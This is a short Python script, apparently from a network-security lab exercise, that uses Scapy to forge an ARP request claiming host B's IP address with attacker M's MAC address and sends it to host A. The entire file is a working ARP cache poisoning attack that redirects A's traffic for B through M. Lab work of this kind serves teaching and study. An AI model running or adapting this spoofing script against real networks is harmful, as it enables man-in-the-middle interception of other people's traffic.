from scapy.all import *

hostA_MAC = "02:42:0a:09:00:05"
hostB_MAC = "02:42:0a:09:00:06"
hostM_MAC = "02:42:0a:09:00:69"
hostB_IP = "10.9.0.6"
hostA_IP = "10.9.0.5"

ePkt = Ether(src=hostM_MAC, dst=hostA_MAC) #From M to A
aPkt = ARP(hwsrc=hostM_MAC, psrc=hostB_IP, pdst=hostA_IP)#, hwdst=hostA_MAC)
aPkt.op = 1 # 1 for ARP Request; 2 for ARP Reply

pkt = ePkt/aPkt

print("Sending the following ARP request packet:")
pkt.show()

sendp(pkt)
print("ARP request sent successfully!")

